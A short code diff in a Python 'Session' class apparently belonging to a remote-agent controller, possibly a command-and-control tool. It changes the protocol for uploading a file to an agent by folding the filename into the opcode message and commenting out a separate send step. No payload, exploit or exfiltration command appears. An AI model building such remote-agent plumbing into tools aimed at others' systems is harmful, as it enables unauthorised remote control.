@@ -105,11 +105,11 @@ class Session():
 
     def upload_file(self, agent_id, file):
         print("[ ] Doing upload")
-        self.channel.sendall("23|" + agent_id)
+        self.channel.sendall("23|" + agent_id + ":" + file.filename)
         self.channel.recv(3)
-        print(file.filename)
-        self.channel.send(file.filename)
-        self.channel.recv(3)
+        #print(file.filename)
+        #self.channel.send(file.filename)
+        #self.channel.recv(3)
         
         buff = b64.encodebytes(file.data).replace(b'\n', b'')
         
